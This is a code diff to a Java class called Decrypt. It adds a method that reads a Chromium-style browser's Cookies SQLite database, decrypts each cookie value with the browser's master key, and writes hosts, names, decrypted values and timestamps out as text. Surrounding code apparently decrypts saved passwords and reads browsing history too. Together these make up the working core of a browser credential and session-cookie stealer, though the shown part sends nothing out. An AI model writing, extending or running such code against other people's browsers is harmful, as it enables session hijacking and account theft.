@@ -5,14 +5,13 @@ import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.sql.*;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
 import java.util.*;
-
 import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
-
 import com.sun.jna.platform.win32.Crypt32Util;
-
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -80,6 +79,46 @@ public class Decrypt {
         return textBuilder.toString();
     }
 
+    public static String extractCookies(String directory) throws Exception {
+        byte[] key = getMasterKey(directory);
+        StringBuilder textBuilder = new StringBuilder();
+        File dbFile = new File(directory + "/Cookies");
+        try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + dbFile.getAbsolutePath());
+             Statement stmt = conn.createStatement();
+             ResultSet rs = stmt.executeQuery("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")) {
+
+            while (rs.next()) {
+                String hostKey = rs.getString("host_key");
+                String name = rs.getString("name");
+                String value = rs.getString("value");
+                long creationUtc = rs.getLong("creation_utc");
+                long lastAccessUtc = rs.getLong("last_access_utc");
+                long expiresUtc = rs.getLong("expires_utc");
+                byte[] encryptedValue = rs.getBytes("encrypted_value");
+
+                String decryptedValue;
+                if (value == null || value.isEmpty()) {
+                    decryptedValue = decryptPassword(encryptedValue, key);
+                } else {
+                    decryptedValue = value;
+                }
+
+                textBuilder.append("Host: ").append(hostKey)
+                        .append("\nCookie name: ").append(name)
+                        .append("\nCookie value (decrypted): ").append(decryptedValue)
+                        .append("\nCreation datetime (UTC): ").append(getDatetime(creationUtc))
+                        .append("\nLast access datetime (UTC): ").append(getDatetime(lastAccessUtc))
+                        .append("\nExpires datetime (UTC): ").append(getDatetime(expiresUtc))
+                        .append("\n===============================================================\n");
+            }
+
+        } catch (SQLException e) {
+            e.printStackTrace();
+        }
+
+        return textBuilder.toString();
+    }
+
     public static String getHistory(String historyPath) {
         StringBuilder textBuilder = new StringBuilder("\n");
 
@@ -108,8 +147,13 @@ public class Decrypt {
         } catch (SQLException e) {
             e.printStackTrace();
         }
-
         return textBuilder.toString();
     }
 
+    private static String getDatetime(long utcTimestamp) {
+        LocalDateTime epochDateTime = LocalDateTime.of(1601, 1, 1, 0, 0, 0);
+        LocalDateTime dateTime = epochDateTime.plusSeconds(utcTimestamp / 1000000);
+        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+        return dateTime.format(formatter);
+    }
 }
